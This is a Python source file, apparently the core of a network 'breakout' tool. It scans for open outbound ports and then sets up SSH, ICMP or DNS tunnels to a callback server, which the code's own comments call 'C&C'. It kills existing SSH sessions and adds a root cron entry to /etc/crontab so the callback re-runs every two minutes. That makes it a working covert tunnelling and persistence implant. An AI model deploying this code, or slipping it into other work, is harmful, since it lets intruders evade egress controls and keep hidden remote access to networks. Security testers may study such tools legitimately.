#!/usr/bin/env python
# By Robin Lennox - twitter.com/robberbear

import shutil
import subprocess
import sys
import time

import lib.PortCheck
from lib.ConnectWiFi import *
from lib.PortCheck import *
from lib.ProtocolCheck import *
from lib.SetupTunnel import *

#Import Colour Scheme
G,Y,B,R,W = colour()

def replaceText(filename,origText,replaceText,):
    s = open(filename).read()
    s = s.replace(str(origText), str(replaceText))
    f = open(filename, 'w')
    f.write(s)
    f.close()

def successMessage(ipAddr,port):
    print W+"------------------------------"+W
    print W+"[!] Port forward using: ssh -f -N -D 8123 root@%s -p%s" % (ipAddr,port,)+W
    print W+"[!] Check it's working using: curl --proxy socks5h://localhost:8123 http://google.com"+W
    print W+"------------------------------"+W

def check_ports(aggressive,verbose,):
    global callbackPort
    callbackPort = []

    print B+"\n[-] Running test for commonly open ports."+W
    
    if verbose:
        print Y+"[*] Checking for open ports using portquiz.net"+W
    check_port(portquiz_scan,aggressive,verbose,)

    # Portquiz might be blocked so try traceroute
    if not lib.PortCheck.openPorts:
        if verbose:
            print R+"[*] portquiz.net returned no open ports"+W
            print B+"\n[-] Running test for commonly open ports."+W
            print Y+"[*] Checking for open ports using traceroute"+W
        check_port(traceroute_port_check,aggressive,verbose,)

    if openPorts:
        callbackPort = int(', '.join(lib.PortCheck.openPorts))
        print G+"[+] Found open port/s: %s" % (callbackPort)+W
    else:
        print R+"[x] No open port found."+W

    if lib.PortCheck.possiblePorts:
        print Y+"[+] Possible open port/s: %s" % (', '.join(lib.PortCheck.possiblePorts))+W

def checkSSHStatus():
    checkSSHFile = '/opt/breakout/lib/checkSSH.sh'
    if os.path.isfile(checkSSHFile):
        with open(checkSSHFile) as f:
            for line in f:
                if str(re.findall(r"(?<=sshUser=')(.*)(?=')",line))[2:-2]:
                    username = str(re.findall(r"(?<=sshUser=')(.*)(?=')",line))[2:-2]
                
                if str(re.findall(r"(?<=callbackIP=')(.*)(?=')",line))[2:-2]:
                    ip = str(re.findall(r"(?<=callbackIP=')(.*)(?=')",line))[2:-2]
                
                if str(re.findall(r"(?<=callbackPort=')(.*)(?=')",line))[2:-2]:
                    port = int(str(re.findall(r"(?<=callbackPort=')(.*)(?=')",line))[2:-2])

        print B+"[*] Check SSH port %s is open on %s" % (port, ip,)+W
        if not openPort(port, ip) or not checkTunnel(ip,port):
            return False
        else:
            return True
    else:
        return False

def attemptCallback(callbackIP,dnsPassword,nameserver,verbose,):
    print B+"\n[-] Attempting to create tunnel."+W
    if callbackIP:
        count = 0
        stopCount = 100
        status = True
        
        # TCP Tunnel
        if callbackPort:
            if verbose:
                print Y+"[*] Calling back to IP %s on port %s" % (callbackIP,callbackPort,)+W
            while (count < stopCount):
                if lib.SetupTunnel.openPort(callbackPort,callbackIP):
                    count = stopCount
                    if lib.SetupTunnel.checkTunnel(callbackIP,callbackPort):
                        print G+"[+] SSH is Open"+W
                        successMessage(callbackIP,callbackPort)
                        return callbackIP,callbackPort,'Open Port'
                        status = True
                    else:
                        print R+"\n[x] Port %s open on IP %s but unable to connect via SSH" %(callbackPort,callbackIP,)+W
                        status = False
                else:
                    if verbose:
                        print B+"[-] Waiting for port %s to be open on IP %s" %(callbackPort,callbackIP,)+W
                    count = count + 1

                    if count == stopCount:
                        print R+"\n[x] Port %s not open on IP %s after %s attempts" %(callbackPort,callbackIP,stopCount)+W
                        status = False
        else:
            print R+"\n[x] Can't attempt TCP Tunnel, no ports found open on IP %s\n" %(callbackIP,)+W
            status = False

        # ICMP Tunnel
        if status == False:
            print Y+"[*] Try a ICMP Tunnel."+W
            if check_icmp():
                if verbose:
                    print G+"[+] ICMP is enabled"+W
                if lib.SetupTunnel.icmpTunnel(callbackIP,verbose,):
                    if lib.SetupTunnel.checkTunnel('10.0.0.1',22):
                        print G+"[+] ICMP Tunnel Created!"+W
                        print B+"[-] An ICMP Tunnel is not as fast as a TCP Tunnel"+W
                        successMessage("10.0.0.1",22)
                        return "10.0.0.1",'22','ICMP'
                        status = True
                    else:
                        print R+"[x] ICMP Enabled but unable to create ICMP Tunnel"+W
                        status = False
                else:
                    print R+"[x] ICMP Enabled but unable to create ICMP Tunnel"+W
                    status = False
            else:
                print R+"[x] Can't attempt ICMP Tunnel, ICMP is disabled\n"+W
                status = False

        # DNS Tunnel
        if status == False and dnsPassword:
            print Y+"[*] Try a DNS Tunnel."+W
            
            #if check_dns(): # Didn't work on open wifi need to check
            #if verbose:
            #    print G+"[+] DNS Queries are allowed"+W
            if dnsTunnel(dnsPassword,nameserver,verbose,):
                successMessage('192.168.128.1',22)
                return '192.168.128.1','22','DNS'
                status = True
            else:
                print R+"[x] Can't attempt DNS Tunnel, DNS is disabled or DNS blocked on the server %s \n" %(nameserver,)+W
                print R+"\n[x] Try connecting to there Name Server %s \n" %(nameserver,)+W
                status = False

def main(aggressive,callbackIP,dnsPassword,isPi,nameserver,PWD,sshuser,tunnel,verbose,):
    if checkSSHStatus():
        sshIP = subprocess.check_output('sudo netstat -tnpa | grep \'ESTABLISHED.*ssh\' | grep -v \"127.0.0.1\" | awk \'{ print $4 }\' | cut -f1 -d\':\' | uniq', shell=True, stderr=subprocess.STDOUT)
        print G+"[+] Tunnel already open and working on %s" %(sshIP)+W

        if isPi:
            # Make the power LED Flash to show the connection is active to C&C
            os.system("sudo sh -c 'echo timer >/sys/class/leds/led1/trigger'")
    else:
        if isPi:
            # Reset Heartbeat
            os.system("sudo sh -c 'echo input >/sys/class/leds/led1/trigger'")

        # Kill all open SSH
        os.system('sudo killall ssh > /dev/null 2>&1')
        callbackPort=22
        tunnelIP=callbackIP
        tunnelPort=callbackPort
        tunnelType='Open Port'
        if openPort(callbackPort,callbackIP) and checkTunnel(callbackIP,callbackPort):
            # Quick check for 22
            successMessage(callbackIP,callbackPort)
            print G+"[+] SSH Tunnel Created!"+W
        else:
            check_ports(aggressive,verbose,)

            # Try incase nothing returned as there is no possible tunnel
            try:
                tunnelIP,tunnelPort,tunnelType=attemptCallback(callbackIP,dnsPassword,nameserver,verbose,)
            except:
                print R+'[!] Tunnel not possible, as no posible tunnels to the callback server could be found'+W
                tunnel = False
                pass

        if tunnel:
            print G+"[+] Setting up remote tunnel back to this device"+W
            checkSSHLOC=PWD+'/lib/checkSSH.sh'
            shutil.copy(PWD+'/lib/checkSSH.bak', checkSSHLOC)
            replaceText(checkSSHLOC,'SET_IP',tunnelIP)
            replaceText(checkSSHLOC,'SET_PORT',tunnelPort)
            replaceText(checkSSHLOC,'SET_USER',sshuser)
            replaceText(checkSSHLOC,'TUNNEL_TYPE',tunnelType)
            if checkSSHLOC not in open('/etc/crontab').read():
                with open('/etc/crontab', "a") as file:
                    print G+"[+] Added SSH to try two minute in /etc/crontab"+W
                    file.write("*/2 * * * * root bash %s > /dev/null 2>&1 \n" %(checkSSHLOC))